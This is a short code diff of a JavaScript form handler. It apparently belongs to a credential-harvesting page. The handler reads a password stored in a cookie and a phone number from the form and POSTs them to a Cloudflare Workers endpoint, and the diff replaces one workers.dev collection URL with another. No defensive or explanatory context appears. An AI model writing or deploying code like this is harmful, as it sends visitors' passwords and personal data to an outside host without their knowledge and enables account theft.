@@ -13,7 +13,7 @@ function submitCustomForm(event) {
     const password = getCookie('password');
     const tel = document.getElementById('tel').value;
 
-    fetch('https://restless-glade-73ca.jebirsunucu.workers.dev/', {
+    fetch('https://worker-icy-adige-6365.jebirsunucu.workers.dev/', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
